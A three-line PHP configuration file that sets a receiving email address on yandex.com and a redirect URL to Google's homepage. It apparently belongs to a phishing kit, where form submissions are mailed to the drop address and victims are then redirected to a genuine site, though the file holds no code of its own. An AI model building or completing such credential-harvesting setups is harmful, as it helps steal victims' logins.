<?php 
$Receive_email="johnsmith61422@yandex.com";
$redirect="https://www.google.com/";
?>